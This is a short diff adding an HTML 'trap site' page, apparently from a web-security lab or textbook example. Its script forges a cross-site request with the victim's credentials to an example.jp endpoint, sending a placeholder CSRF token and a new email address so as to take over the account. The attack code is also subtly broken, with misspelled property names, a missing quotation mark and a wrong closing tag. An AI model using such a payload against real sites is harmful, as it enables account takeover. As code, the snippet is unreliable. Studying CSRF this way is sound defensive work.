@@ -1,0 +1,11 @@
+<body>
+罠サイト
+<script>
+  var req = new XMLHttpRequst();
+  req.open("POST", "http://example.jp/4g/4g-021a.php");
+  req.withCredentiales = true;
+  req.setRequestHeader('X-CSRF-Token',
+  000000000000000000000000000000000000');
+  req.send('{"mail": "creacked@example.jp"}');
+</script>
+<body>
